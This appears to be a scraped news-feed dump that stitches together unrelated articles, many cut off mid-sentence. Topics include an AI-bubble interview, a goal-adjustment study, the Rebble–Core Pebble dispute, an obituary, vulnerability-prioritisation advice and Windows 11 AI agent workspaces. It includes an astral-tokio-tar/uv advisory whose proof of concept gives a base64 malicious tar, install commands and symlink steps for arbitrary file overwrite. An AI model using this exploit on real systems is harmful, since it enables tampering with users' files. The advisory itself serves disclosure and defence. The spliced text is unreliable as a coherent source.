This saw the values of early internet companies surge amid a wave of optimism for what was then a new technology, before the bubble burst in early 2000 and many share prices collapsed.This led to some companies going bust, resulting in job losses. A drop in share prices can also hit the value of people's savings including their pension funds.In comments echoing those made by US Federal Reserve chairman Alan Greenspan in 1996, warning of "irrational exuberance" in the market well ahead of the dotcom crash, Mr Pichai said the industry can "overshoot" in investment cycles like this."We can look back at the internet right now. There was clearly a lot of excess investment, but none of us would question whether the internet was profound," he said."I expect AI to be the same. So I think it's both rational and there are elements of irrationality through a moment like this."His comments follow a warning from Jamie Dimon, the boss of US bank JP Morgan, who told the BBC last month that investment in AI would pay off, but some of the money poured into the industry would "probably be lost".But Mr Pichai said Google's unique model of owning its own "full stack" of technologies - from chips to YouTube data, to models and frontier science - meant it was in a better position to ride out any AI market turbulence.The tech giant is also expanding its footprint in the UK. In September, Alphabet announced it was investing in UK artificial intelligence, committing £5bn to infrastructure and research over the next two years.Mr Pichai said Alphabet will develop "state of the art" research work in the UK including at its key AI unit DeepMind, based in London.For the first time, he said Google would "over time" take a step that is being pushed for in government to "train our models" in the UK - a move that cabinet ministers believe would cement the UK as the number three AI "superpower" after the US and China."We are committed to investing in the UK in a pretty significant way," Mr Pichai said.Mr Pichai said action was needed, including in the UK, to develop new sources of energy and scale up energy infrastructure."You don't want to constrain an economy based on energy, and I think that will have consequences," he said.He also acknowledged that the intensive energy needs of its expanding AI venture meant there was slippage on the company's climate targets, but insisted Alphabet still had a target of achieving net zero by 2030 by investing in new energy technologies."The rate at which we were hoping to make progress will be impacted," he said.AI will also affect work as we know it, Mr Pichai said, calling it "the most profound technology" humankind had worked on."We will have to work through societal disruptions," he said, adding that it would also "create new opportunities"."It will evolve and transition certain jobs, and people will need to adapt," he said. Those who do adapt to AI "will do better"."It doesn't matter whether you want to be a teacher [or] a doctor. All those professions will be around, but the people who will do well in each of those professions are people who learn how to use these tools."]]></content:encoded></item><item><title>Defeating

But it turns out that quitting might often be your healthiest option.Researchers have long sought to understand how persistence is linked to personal well-being and human evolution more broadly. One poorly supported theory posited that our ancestors were so determined to catch prey that they ran for long stretches in hot, dry environments.Newer evidence suggests that ditching tough-to-attain goals can actually be good for us. According to a review of more than 230 studies recently published in the journal , adjusting our goals in response to stress or challenges, rather than grinding on, is often “a more appropriate and beneficial response.”The authors of the sweeping meta-analysis examined 235 studies spanning various fields, including psychology, health, and social sciences, that detailed how people shift their goals after encountering obstacles to success. The researchers wanted to consolidate this “fragmented” information and observe how adjusting goals relates not only to psychological well-being but also physical health, social functioning, and future ambitions. This allowed them to chart a goal “roadmap.”

      “Sticking with impossible goals can take a real toll, with previous research suggesting it can lead to higher stress, poorer well-being, and even physical health costs such as illness,” said study author Hugh Riddell, a professor at the School of Population Health at Curtin University in Australia, in a statement. “But letting go and—crucially—reengaging with new goals, was found to restore purpose and well-being.”The team employed statistical analysis to illuminate what causes people to ditch, adjust, or re-engage with goals. Disengagement from goals, for example, was most strongly linked to negative feedback on these ideas and an “action crisis” stemming from one’s failure to overcome related obstacles. Our personalities might also play a major role in these types of decisions: Optimism tended to be strongly linked to one’s openness to revise a goal to better fit their skills and resources. “These findings indicate that goal-striving flexibility is more likely to emerge when individuals feel secure, exhibit stable regulation, and possess emotional resilience,” the paper notes.The scientists also analyzed the impacts of these decisions. Giving up on goals was significantly linked to reduced stress, anxiety, and depression, for instance. And adopting new ones was strongly associated with high social and physical functioning. Finding new goals also came with moderate to large benefits to psychological functioning, feeling a sense of purpose in life, satisfaction, and personal growth.

      This analysis comes with limitations, the authors acknowledge, due to observational data collected at specific points in time and risks of bias in individual papers. The next step, they write, is to pinpoint the specific moment that people should rethink their dreams or keep on chugging. “Finding out when exactly people should stick with their goals or change course, without giving up too early, is really the next piece of the puzzle,” Riddell said in the statement.So whether you’re the type to stick with it to the bitter end or change course when you sense trouble up ahead, there may be an optimal method to help you achieve—or alter—your goals.

The Gravity Forms plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the legacy chunked upload mechanism in all versions up to, and including, 2.9.21.1. This is due to the extension blacklist not including .phar files, which can be uploaded through the chunked upload mechanism. This makes it possible for unauthenticated attackers to upload executable .phar files and achieve remote code execution on the server, granted they can discover or enumerate the upload path. In order for an attacker to achieve RCE, the web server needs to be set up to process .phar file as PHP via file handler mapping or similar.

When we wrote last month about our agreement with Core Devices, we went into it believing that cooperation between Core and Rebble would be the best decision for the Pebble community.  Core would spearhead the development of brand new watches, and we’d be there to provide our Rebble Web Services to go with them.Unfortunately, our agreement is already breaking down.  We hoped that by putting on a kind face, and publishing an optimistic-sounding blog post along with Eric, that we’d be able to collaborate in a way that met our responsibilities to you, our users.  We knew that neither of us would be able to get all we wanted, but we thought we had enough common ground that we could serve Pebble users together.Rebble has been working since the beginning to keep the Pebble experience alive – maintaining the App Store, building new services like Bobby, and running frontline support for people keeping their Pebbles ticking the whole time.  (The Pebble App Store that Core offers  is backed by Rebble!)  But Eric and Core recently demanded that, instead of working together, we need to just give them all of our work from the last decade so that they could do whatever they want with it.  And in Eric’s latest newsletter, he hasn’t told you the truth about where the work that makes his business run came from.  We’d rather have cooperated with them to build something great together, but we’ve reached an impasse. So now, we’re asking you – our community – what to do with Core.Update (November 18th, 7pm Pacific): Eric responded to this blog post.  Obviously we don’t
entirely agree with his position, and we don’t agree with how he has characterized our
position – if we did, we wouldn’t be having this conversation! – but you
should definitely read it too.Edit (November 19th, 5pm Pacific): We added the words ‘collected by, maintained by, hosted by, and served by’ around ‘100%’ below to
more accurately reflect our original intent.Nine years ago, Eric Migicovsky’s company, Pebble Technology Corporation, went out of business and dropped support for the hundreds of thousands of Pebble smartwatches out there.  Rebble – and our community! – put together a Herculean effort to salvage the data that was left on the Pebble app store.Since then, we built a replacement app store API that was compatible with the old app store front end.  We built a storage backend for it, and then we spent enormous effort to import the data that we salvaged.  We’ve built a totally new dev portal, where y’all submitted brand new apps that never existed while Pebble was around.  So far, we’ve spent hundreds of thousands of dollars on storing and hosting the data.  And the humans who run the Rebble servers have also spent incredibly late nights upgrading Kubernetes clusters, responding to outages, and generally keeping things ticking.What you now know as the Pebble App Store from Eric’s new company, Core Devices, is the result of nearly a decade of our work.  The data behind the Pebble App Store is 100% collected by, maintained by, hosted by, and served by Rebble.  And the App Store that we’ve built together is much more than it was when Pebble stopped existing.  We’ve patched hundreds of apps with Timeline and weather endpoint updates.  We’ve curated removal requests from people who wanted to unpublish their apps.  And it has new versions of old apps, and brand new apps from the two hackathons we’ve run!We’ve been negotiating with Eric for months now.  We’ll compromise on almost everything else, but our one red line is this:Whatever we agree on, there has to be a future for Rebble in there.We want to give Core’s users access to the Rebble App Store. (We thought we agreed on that last month.)  We’re happy to commit to maintaining the Web Services.  We’d be happy to let them contribute and build new features.  And what we want in return is simple: if we give Core access to our data, we want to make sure they’re not just going to build a walled garden app store around our hard work.The problem is, Core won’t commit to this.  Core wants unrestricted access to do whatever they want with the data that we archived and have spent the last years curating, maintaining servers for, and keeping relevant.  If we gave Core the rights to use the App Store data however they want, they could build their own Core-private App Store, replace Rebble, and keep any new changes proprietary – leaving the community with nothing.We’ve asked Eric about this every time we talk.  He has occasionally said verbally that that isn’t their plan…  but when it comes time to put it in writing, he has repeatedly refused to guarantee that.  A week ago, we asked him to chat about this one more time – he delayed our conversation, and then in the intervening time, scraped our app store, in violation of the agreement that we reached with him previously.We’re sad that the Rebble community has had tension with Core Devices ever since Google released the original PebbleOS source code.  We’ve been pretty quiet about it for a while – we thought that we had a chance of working together if we tried hard not to fracture the community.  But by now, a verbal promise isn’t enough.Rebble’s work is the backbone of Core in other ways.  The Core Devices app is based on ; in Eric’s blog post, he said that Core built it.  The reality is that it started life as , which Rebblers wrote as part of our mobile app project (Cobble), and we funded through the Rebble Grants program.  The work that we did together saved Core a month or two of engineering effort at the beginning; Core took Rebble’s work, added to it, and then paid us back by putting a more restrictive license on their contributions and wrapping a closed-source UI around it.A few months ago, Core promised that they would let Rebble maintain and own the developer site, after Rebblers spent days making it build again, importing new content, etc.  Then, in Eric’s original proposed agreement, he demanded not only that Core publish the developer site on their domain, but that we remove our copy of the developer site and redirect to theirs.These have been blows to our community, to be sure.  We’ve tried not to let this affect our negotiations: we want to work together.  But we went into this wary, knowing what a promise from Core meant.The last straw was two weeks ago.  We’d already agreed to give Core a license to our database to build a recommendation engine on.  Then, Eric said that he instead demanded that we give them all of the data that we’ve curated, unrestricted, for him to do whatever he’d like with.  We asked to have a conversation last week; he said that was busy and could meet the following week.  Instead, the same day, our logs show that he went and scraped our servers.Rebble’s goal is to have a community-driven place to develop for these watches that we all love – today, and also in the future, if (love forbid!) something were to happen to Core Devices.If we gave Eric an unrestricted license to our data, he could do the same thing he did to our firmware work, and our mobile app work.  He’d have the right to take it and build his own app store – and the work that we’ve done together as a community for the past decade would no longer be in our control.We watched this happen ten years ago when Pebble went under (Rebble has been around longer than Pebble and Core combined by now!).  We don’t know that Core can commit to supporting this ecosystem in the long term.  After all, the warranty on Pebble 2 Duo is 30 days long, and early users are already reporting thattheir buttons are falling apart!But even if Eric has the best intentions now and can find the funds to keep Core afloat, you could imagine that OpenAI, or someone else, would want to acquire Core and make him an offer he couldn’t refuse.  We’ve watched this play out so many times, from so many other companies, in the decade since – a product we love gets released, and then gets killed off, another victim of closed-source enshittification for profit.  We love these watches, and we’d be sad if that happened.  And more to the point, we love this community that we’ve been a hub for.In our last post, we said that Rebble belongs to you.  We mean it.  These are the apps that you’ve written and contributed to your fellow Pebblers.  These are the watches that you spent so long caring about and loving.  This is your community, where you make awesome happen.  So we see two directions from here, and we need the community’s help to decide.If y’all would like, one option is that we could aggressively protect the work we’ve done, and try to protect the community going forward.  If Eric had the foresight to back up this data nine years ago and maintain it himself, there’s nothing we could say about this.  But he didn’t, and we, together, did.  We made it absolutely clear to Eric that scraping for commercial purposes was not an authorized use of the Rebble Web Services.This gets ugly in a hurry, but we have legal resources that can protect us.  We’d rather spend our time on building a next-generation open source mobile app than spend it on a fight, but if it’s what we have to do, we’re not afraid.  If we want to keep what we built, we’re going to have to use our energy to protect it.The other option is that we could just let Eric do whatever he wants.  Eric believes that our database should be free for anyone to make their own copy of, because we are a non-profit Foundation.  We don’t agree, but maybe you do!  Nothing has to live forever, and we’ve done great work together.  If the community prefers that we pass the mantle onwards, we’ll do what y’all think is right.These are both painful options for us.  And to be clear, we’d rather do neither!  If Eric and Core are willing to give us a legal commitment that they’re not just going to kick us out, and that they’ll work with us, we’d much rather do that.  We’re happy to let them build whatever they want as long as it doesn’t hurt Rebble. Eric, you’re the best in the world at making quirky hardware for people who genuinely love what they wear.  We’re great at building a community.  Use our locker, use our timeline, use our App Store – we’ve built it just for you.  Just as long as we can work together as partners.But in the mean time, we’re here at a crossroads.For our friends who have supported us over the past years: we’re sorry that you’re caught in the middle of this.  We think Rebble can be the hub of community, and Core can make awesome products, and these don’t have to be in conflict.  Eric’s new devices, Pebble 2 Duo and Pebble Time 2, look absolutely amazing!  We want to support him in making beautiful hardware long into the future – without exposing our users to the classic walled garden enshittification trap.  If Eric and Core can’t play nice, we need you, our community, to tell us what to do.   We’re serious: if you think we should do something different, we will.  So we’re posting this on Reddit /r/pebble and a handful of other places.  We’ll be (gulp!) reading the comments – the top rated  the long tail – to try to understand what the community’s sentiment is.  We’ll be watching the discussion on Discord.  And, of course, if you want, you can e-mail the Rebble Foundation Board of Directors directly.  We’d like to hear from you.Yours in hope –
so many of us from the Rebble team over the past 9 years, including:

The news was shared to Bluesky by Heineman's friend, Heidi McDonald, while the most recent post on Heineman's GoFundMe is a goodbye message stating that her health was rapidly deteriorating, and she was entering palliative care. Heineman was 62, and the GoFundMe will remain live to help her family make final arrangements.Born in 1963, Heineman initially made a mark on the industry by winning a national Space Invaders tournament in 1980 in New York, becoming the first formally recognized US champion of any videogame. She went on to have a far-reaching career, being credited on 67 games according to MobyGames.Heineman co-founded Interplay in 1983 alongside Brian Fargo, Jay Patel, and Troy Worrell. The developer and publisher was the source of many foundational PC games, including Wasteland, Fallout, and Baldur's Gate. Heineman designed and programmed a number of games at Interplay, with her most prominent design credit being The Bard's Tale 3: Thief of Fate.Heineman's friend and colleague from Interplay, Brian Fargo, shared a remembrance of the developer on X. "Rebecca Heineman sadly passed away," Fargo wrote. "Known her since the 80s when I'd drive her to work, one of the most brilliant programmers around. A real gut punch earlier today when she messaged me: 'We have gone on so many adventures together! But, into the great unknown! I go first!!!'"Later, in the '90s and 2000s, Heineman made a name primarily as a programmer, particularly on ports like the Macintosh versions of Wolfenstein 3D, Baldur's Gate, and Icewind Dale. The saga of Heineman overcoming a deranged businessman to solo program the ill-fated 3DO port of Doom in mere weeks has become a bit of an internet legend: Here's Digital Foundry and Heineman herself recounting the tale.Heineman publicly came out as transgender in the 2000s, and was married to fellow games industry legend Jennell Jaquays. Heineman was the recipient of Gayming's 2025 Gayming Icon award, with the site writing that "her advocacy for LGBTQ+ inclusion, accessibility, and diversity in tech has inspired countless developers and players."Jaquays died of complications from Guillain–Barré syndrome in January 2024, and Heineman was blindsided last month by an aggressive cancer diagnosis. She turned to GoFundMe to help with the costs of treatment, where fans, friends, and industry peers showed up to support the developer.Heineman shared the message last night that her health was rapidly declining."It's time. According to my doctors. All further treatments are pointless," Heineman wrote. "So, please donate so my kids can create a funeral worthy of my keyboard, Pixelbreaker! So I can make a worthy entrance for reuniting with my one true love, Jennell Jaquays."Game developers have begun sharing their own condolences and remembrances in the wake of Heineman's death.Rebecca was one of the founders of Interplay and programmed & designed for some of the most influential games of my youth, notably Bard's Tale I & III and Wasteland. She will be missed.— @jesawyer.bsky.social (@jesawyer.bsky.social.bsky.social) 2025-11-18T00:17:03.191ZWhat a remarkable human, and what a remarkable thing to know that she passed bemused at reading her own eulogies.
Rest in peace, Rebecca. Thank you for everything.— @ramiismail.com (@ramiismail.com.bsky.social) 2025-11-18T00:15:53.662ZRebecca was in my life because she reached out to me, a stranger, because she'd caught wind of a layoff I was impacted by. Her achievements were great, and so too was her kindness.— @jyoungman.bsky.social (@jyoungman.bsky.social.bsky.social) 2025-11-18T00:15:53.699ZRest well, you legend, you pioneer, you wonderful soul. I'm lucky to have known you, though briefly. Please share her legacy by reposting Heidi's message. 💖— @caseymongillo.bsky.social (@caseymongillo.bsky.social.bsky.social) 2025-11-18T00:15:53.712Zin the early 2000s Rebecca took the time to chat over IRC with a teenaged and gender-confused Me on the practicalities of transition - in a time where being out as trans online was something that could get you socially ostracized. I owe her a lot for that and only hope I can pay it forward.— @moomanibe.bsky.social (@moomanibe.bsky.social.bsky.social) 2025-11-18T00:15:53.675Z]]></content:encoded></item><item><title>I caught Google Gemini using my data and then covering it up</title><link>https://unbuffered.stream/gemini-personal-context/</link><author>JakaJancar</author><category>dev</category><pubDate>Tue, 18 Nov 2025 01:11:34 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Critical W3 Total Cache Flaw (CVE-2025-9501, CVSS 9.0) Risks Unauthenticated RCE on 1 Million WordPress Sites</title><link>https://securityonline.info/critical-w3-total-cache-flaw-cve-2025-9501-cvss-9-0-risks-unauthenticated-rce-on-1-million-wordpress-sites/</link><author></author><category>security</category><pubDate>Tue, 18 Nov 2025 00:40:41 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Your team can’t patch everything.With some organizations facing tens of thousands of vulnerability alerts each month, it’s clear that detection isn't the problem anymore. The challenge that keeps vulnerability management teams up at night is prioritization. With limited resources and maintenance windows, you can't patch everything immediately. You need to know what matters most.Relying on universal CVSS scores that aren't specific to your organization won't solve this prioritization challenge. A vulnerability might score 9.8 on the CVSS scale, suggesting catastrophic risk, yet never be exploited in the wild. Meanwhile, a 7.5-rated vulnerability could be actively fueling ransomware campaigns targeting your industry right now.Why CVSS alone falls shortCVSS serves a purpose. It provides a standardized way to measure the theoretical severity of vulnerabilities based on their technical characteristics. It tells you how bad things could get if someone exploits a vulnerability under ideal conditions. That's valuable information, but it's only part of the story.CVSS can't tell you whether cybercriminals are actively exploiting a vulnerability. It doesn't know if ransomware groups have weaponized it or if working exploit code is circulating in the wild. It can't assess whether a vulnerability affects your critical payment processing systems or an isolated test server. And it certainly can't determine whether you can actually deploy a patch without breaking essential business operations.This gap between theoretical risk and practical reality creates a dangerous blind spot. Teams end up in one of two traps: either they try to patch everything rated "critical" or "high," burning out their staff and disrupting operations, or they become numb to the constant stream of high scores and miss the vulnerabilities that truly matter.The solution isn't to abandon CVSS. The solution is to enhance it with real-world context. You need a framework that answers the questions CVSS can't address. That's where the three-pillar approach transforms vulnerability management from overwhelming to actionable.The three-pillar framework: your guide to modern prioritizationThe three-pillar framework provides a systematic approach to cut through the noise, identify what truly requires immediate action, and clearly communicate the evidence to defend those decisions to patching teams and leadership.Each pillar answers a fundamental question that transforms raw vulnerability data into actionable intelligence. Together, they help give you the context needed to confidently prioritize your patching efforts and communicate those priorities to stakeholders who need to understand why certain vulnerabilities jump to the front of the queue.Intelligence pillar: how likely is exploitation?The first pillar shifts your focus from theoretical to actual risk. While CVSS measures how severe a vulnerability could be in theory, the intelligence pillar asks the questions that matter in practice for your organization:Is anyone actually exploiting this vulnerability?Are ransomware groups using it in active campaigns?Does proof-of-concept (PoC) code exist in the wild?Is exploitation trending upward or remaining dormant?Consider this scenario, your scanner flags two vulnerabilities:The first has a CVSS score of 10, but it’s never been observed in real-world attacks.The second has a CVSS of 7.5 but appears in ongoing ransomware campaigns targeting organizations in your industry.Which deserves your immediate attention? The intelligence pillar provides the critical context that the second vulnerability may take priority.The Intelligence pillar provides this critical context. It transforms abstract severity scores into actionable threat intelligence by revealing which vulnerabilities are actually being exploited in the wild. Without this intelligence layer, you're essentially patching blind, potentially spending weeks addressing theoretical risks while missing the vulnerabilities criminals are actively using.Environmental pillar: what’s your specific risk?A vulnerability doesn't exist in isolation. Where it lives in your environment determines its actual risk to your organization. The Environmental pillar forces you to map generic vulnerability data to your specific infrastructure and business context.The same vulnerability presents vastly different risk profiles depending on its location:Is it on an internet-facing payment server or an air-gapped development system?Does it affect one legacy application or your entire server fleet?Are the vulnerable systems processing customer data or internal test data?Do these systems connect to critical business partners or operate in isolation?Scale matters too. A CVSS 9.0 vulnerability affecting one isolated system generally poses less organizational risk than the same vulnerability present across hundreds of production servers. When two vulnerabilities have equal severity and exploitation likelihood, the one touching more assets typically deserves priority. More exposure points mean more opportunities for compromise and greater remediation complexity.CVSS treats every vulnerability as equal, yet modern vulnerability management teams have learned that environmental context proves otherwise. A SQL injection vulnerability on your public e-commerce platform demands different treatment than the same flaw on an internal reporting tool. The environmental pillar captures these crucial distinctions.By mapping vulnerabilities to your actual infrastructure, you move from broad categorizations to precise, business-aligned priorities. This isn't about making excuses for delayed patching. It's about ensuring your limited resources protect what matters most to your organization.Organizational pillar: can you actually fix it?Even the most critical vulnerability becomes meaningless if you can't address it. The Organizational pillar acknowledges a reality that pure risk scoring ignores: your ability to actually implement fixes varies dramatically across your infrastructure.This pillar addresses practical constraints:Does a patch exist from the vendor?Will deploying it break critical business operations?Do you have administrative access to the affected systems?Can you meet change control requirements for production systems?Are there compensating controls that reduce risk without patching?Resource limitations shape what's possible:Your single vulnerability management engineer can't tackle the same volume as a dedicated team of ten.Budget constraints might prevent upgrading legacy systems.Maintenance windows might only occur quarterly for critical infrastructure.For better or worse, these realities determine which vulnerabilities you can meaningfully address.The organizational pillar transforms these constraints into strategic advantages by focusing efforts where you can achieve real risk reduction rather than pretending every vulnerability is equally fixable. This means prioritizing ten medium-severity vulnerabilities you can patch this weekend over a critical vulnerability requiring a six-month system overhaul, while also revealing opportunities for alternative risk reduction. By acknowledging what you can't change, you identify creative solutions for what you can control.This doesn’t mean you should disregard vulnerabilities you cannot immediately patch. Adding these to a watch list ensures you're alerted when their risk profile changes; when proof-of-concept code appears, exploitation becomes likely, or active attacks begin. This heightened awareness lets you adjust compensating controls or expedite remediation efforts as the threat landscape evolves.Most importantly, this pillar provides the business context that resonates with leadership. When you explain that fixing vulnerability X requires shutting down manufacturing for a week while vulnerability Y can be addressed during normal maintenance, priorities become clear. You're not making excuses. You're making informed business decisions about risk.Transforming communication and actionArmed with insights from all three pillars, you transform how you communicate about vulnerabilities both within your security team and to leadership. This targeted, evidence-based approach cuts through patch fatigue and clearly articulates why specific vulnerabilities demand immediate attention.Stop saying: "We have 1,000 critical vulnerabilities to patch this month."Start saying: "We've identified 10 vulnerabilities being actively exploited by three ransomware groups that specifically target financial services organizations. Eight affect our payment processing systems, and we can patch them this weekend.

When you can show leadership that APT groups with proven intent to target your industry are actively exploiting certain vulnerabilities, priorities become crystal clear.

# "Astral-tokio-tar" / "uv" Arbitrary Write Path Traversal Vulnerability

## Package

## Affected versions

## Patched versions

## Description

### Summary

"astral-tokio-tar", a Rust crate used by the popular tool "uv", has a vulnerability that allows arbitrary file writes when unpacking tar files. In "uv" this vulnerability allows a Python source distribution to write anywhere during extraction.

This vulnerability is primarily due to astral-tokio-tar's support of symlinks and the "memoized set" behavior that skips path validation on previously observed and validated paths.

Since a symlink can point to a directory, and can be changed by having multiple entries in the tar file, it is possible to create a symlink to a benign directory under the destination path, have it validated, added to the memoized set, and then change the symlink to another arbitrary directory anywhere on disk.

Additionally a symlink that points to an arbitrary directory and bypasses any validation can be created by using two symlinks, where the first symlink created depends on the second symlink to bypass validation.

This vulnerability allows an attacker to generate tar files that can create or change arbitrary files on the filesystem.

### Severity

Medium - Due to the potential for arbitrary code execution.

### Proof of Concept

```
mkdir /tmp/flag $ echo "hello" > /tmp/flag/flag $ ls /tmp/flag flag $ echo "H4sICOmxkWgCA2R1bW15cGFja2FnZS0wLjAuMS50YXIA7Zhra9swGIX92b9C86cNGsWSZasLbeku7MJYVxjsSwlBSdTUm29znLZh7L9PcrIm3ZousNQN7XkIsZFesMl5j44U2qbtw2N1+U6roS6dO8Gfserq+4FY3Ntx5nPGHXLpNMBkXKnSPN55nPBdklZxqveZDEUgpdiVNOAB5xF3HfDgGU7SdFqowTc10i2f+pS1l4favV6cxVWvR4vpf/k/EmK1/5l0WOgLEfBImHufhZFkDvHh/zunKOOseuq9tpp7z2D5xwbdivwP/s5/hvxvJP/l9fwPeUDl8yiUu1gLHmn+F9OizL/qQUWrPE025P/b8j8IxSL/I1PHhF0SkP8NcNKfxMmwNZ6OK5123VJ/n8SlHpN9cuKdJmbnN8hLTQ72A8p39oTXdWf1fdMxOhuaskUVradUEXuuezJvoa6bqVTbsuVG81w1qc7ysn7Mj98Vr1Si++RlmV9k3g7RqYoTOzyww307ejjK81Gi6SBPvZ9d91yX4zjPbE3duJ471ONBGRfVfNQIOybKvP6ZKofmpeD2tfx//OFt6/3Rm08bzf/b/M999kf+cxYI+L8JPupKDVWlWl9mbuoQToV7ZCzZIcu94V7N103ifjZzqpx2yDWTuS9qX7dq83bIkqPJ3o0+PoApt+/8rwf5tL3h/b/ZWTr1ST9k8yu/5vlZ/ge+YOYswKJAcIeETfp/0Z431/1r/gHt/6oNnwNn+sv19A/t/k/6LHQIrzsR+jev/+w/wI3mfyTW018yqz9jTec/9N8K/0e+Wf8DLiLr/yzPi/a6X5Su/FRp0T5N1Aj6r6O//TXvSX8ujfQ2/zmTRn8K/9/T+r/KLXez/jN+5X/JudU/klj/GyE/1+VFGVcaBzGc/xb+z/TFaZzopvzPFv4PrP+lwP6vGeZCP4H9AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADYfn4BXGg1JABQAAA=" | base64 -d > dummypackage-0.0.1.tar.gz $ mkdir test $ cd test $ uv venv env $ . env/bin/activate $ uv pip install ../[dummypackage-0.0.1.tar.gz](http://dummypackage-0.0.1.tar.gz/) Using Python 3.12.3 environment at: env Resolved 1 package in 5ms Built dummypackage @ file:///home/calebbrown/dummypackage-0.0.1.tar.gz Prepared 1 package in 474ms Installed 1 package in 0.95ms + dummypackage==0.0.1 (from file:///home/calebbrown/dummypackage-0.0.1.tar.gz) $ ls /tmp/flag flag newfile $ cat /tmp/flag/flag overwrite $ cat /tmp/flag/newfile newfile!
```

### Further Analysis

#### Root Cause

##### Parent Memorization

The "astral-tokio-tar" method `Entry.unpack_in_raw()` was added to the library in v0.5.0 to allow a memoized set to be passed in as an argument, to improve the performance of filesystem operations.

In "uv", the method `untar_in()` in uv-extract creates a memoized set and uses the same set while extracting every entry in a tar file with `Entry.unpack_in_raw()`.

The memoized set is used in `EntryFields.unpack_in()` with the following logic:

```
// Validate the parent, if we haven't seen it yet. if !memo.contains(parent) { self.ensure_dir_created(dst, parent).await.map_err(|e| { TarError::new(format!("failed to create `{}`", parent.display()), e) })?; self.validate_inside_dst(dst, parent).await?; memo.insert(parent.to_path_buf()); }
```

In this context `parent` is the parent directory for the entry currently being extracted. So, if `file_dst` is `"path/to/file.txt"` then `parent` would be `"path/to"`.

The call to `self.validate_inside_dst(dst, parent)` is only made if `parent` is not yet in `memo`.

We can use a symlink to change the effective `parent`, after it has been added to `memo`.

Symlinks allow other paths to be referred to indirectly using a file-like object. This means that a path, using a symlink can have a `parent` that passes the validation, populating `parent` in `memo`.

The symlink can then be replaced with another symlink, and since the name of the symlink has not changed, the check is now skipped.

##### Symlink Check Bypass

astral-tokio-tar has a check guarded by the `allow_external_symlinks` flag that attempts to ensure that symlinks do not point outside the destination directory `dst`. However, this check can also be bypassed by creating the two symlinks below in order:

1. `"ptr"`-> `"noop/noop/noop/noop/noop/noop/noop/noop/noop/../../../../../../../../../tmp"`    1. This path passes the symlink check as it evaluates "tmp", under the destination directory.
2. `"noop"`-\> "."

   2\. This path also passes the symlink check as it evaluates to the destination directory.

After they have both been created `"ptr"` now effectively points to `"./../../../../../../../../../tmp"`, which is likely outside the destination directory.

##### Putting it Together

The following tar entries can now be used for arbitrary writes:

1. Directory `"decoy"`.
   1. The directory "{dst}/decoy" is created.
2. Symlink `"ptr"`-> `"decoy"`.

   2\. The symlink `"{dst}/ptr"` is created.
3. Empty file `"ptr/dummy"`.

   3\. The file `"{dst}/ptr/dummy"` is extracted (i.e `"{dst}/decoy/dummy")`.

   3\. This write also causes `"{dst}/ptr"` to be inserted into memo.
4. Symlink `"ptr"`-> `"noop/noop/noop/noop/noop/noop/noop/noop/noop/../../../../../../../../../tmp"`.

   4\. The symlink `"{dst}/ptr"` is replaced.
5. Symlink `"noop"`-> `"."`.

   5\. The symlink `"{dst}/noop"` is created.

5. `"ptr"` now points to `"{dst}/./../../../../../../../../../tmp"`.
6. Malicious payload file `"ptr/payload"`.

   6\. The file `"{dst}/ptr/payload"` is extracted (i.e. `"/tmp/payload"`).

   6\. Validation on `"{dst}/ptr"` is skipped as it has already been added to `memo`.

It will also allow AI agents to have their own runtime, desktop, user account, and ability to always run in the background if you turn on the feature.New agentic features in Windows 11As soon as I installed Windows 11 Build 26220.7262, Windows Latest noticed a new toggle “Experimental agentic features” inside the “” page in the  app > .This turns on “Agent Workspace,” but it doesn’t work right now, and if you’re wondering, it’s only available to Windows Insiders in the Dev or Beta Channel.What are AI Agents and how do they work?If you’ve ever used ChatGPT, you might have come across ‘Agents.’ AI Agents have their own interface, and they navigate just like a human.For example, if you ask ChatGPT’s Agent to book a trip, it’ll open Chromium on Linux in an Azure container, search for the query, visit different websites, navigate each page, and book a flight ticket using your saved credentials. An AI Agent tries to behave like a human, and it can perform tasks on your behalf while you sit back and relax (spoiler: you don’t).That’s the core idea Silicon Valley is trying to sell. However, it doesn’t work as well as companies like OpenAI and Perplexity claim.What the hell is Agent Workspace on Windows 11?Agent workspace is a separate, contained Windows session made just for AI agents, where they get their own account, desktop, and permissions so they can click, type, open apps, and work on your files in the background while you keep using your normal desktop.This feature is completely optional and is never turned on by default. To test it, I turned on the feature, and Microsoft created an extra “workspace.” It’s very similar to how Windows Sandbox or Workspaces in Microsoft Edge work, but it could be a potential security disaster, as even Microsoft is warning about risks.When Windows spins up this extra workspace, it gives it limited access (like specific folders such as Documents or Desktop) and keeps its actions  and .Each agent can have its own workspace and access rules, so what one agent can see or do doesn’t automatically apply to others, and you stay in control of what they’re allowed to touch.“The creation of the agent workspace where agents can work in parallel with a human user, enabling runtime isolation and scoped authorization,” Microsoft noted in a support document. “This provides the agent with capabilities like its own desktop while limiting the visibility and accessing the agent has to the user’s desktop activity.”A bit similar to Sandbox?You might find the idea of Agent Workspace a bit similar to Windows Sandbox. Microsoft argues that Windows Agent Workspace is more “efficient” than a virtual machine, such as Windows Sandbox, because:The agent still has security isolationSupports parallel executionand gives you control… as you can allow the Agent to access your personal folders even when it’s running in a separate isolated instance. Or you can see the logs.“The overall experience and security model are actively being refined to support key principles of transparency, safety, and user control,” Microsoft says.While Agent and Sandbox have similarities like isolation, Sandbox does not have access to your personal files or folders. In Windows Sandbox, Microsoft creates an isolated and hardware-based virtualization, and even a separate kernel to keep the sandbox completely separate.When you turn off Sandbox, all of its activities are deleted. We can’t say the same for AI agents.Windows 11 lets AI agents into your Documents and Desktop folders by default, with read and write accessWhen you turn on the feature, you’re giving agents access to apps and even local folders, such as Desktop, Music, Pictures, and Videos.I dug a bit into the implementation, and it looks like Agent Workspace has limited access to your local folder inside (C:\Users\<username>\). When the toggle “Experimental Agent features” is enabled, Windows gets access to the following folders: Downloads, Desktop, Videos, Pictures, and Music.These folders are called “Known folders,” a feature that Microsoft added with Windows Vista.Since Agent workspace is using known folders, it can always locate these folders (Documents, Downloads, Desktop, Videos, Pictures, Music) even if you’ve redirected the location elsewhere in the filesystem.Why do Agents need access to my personal folders?To run things for you. Simple. Agent Workspace requires access to apps or private folders to perform actions on your behalf. Microsoft insists that it’s taking care of security implications by giving Agent Workspace its own authorisation (a separate account, similar to your user account), runtime isolation.Each agent will have its own defined set of dos and don’ts.The idea is to give 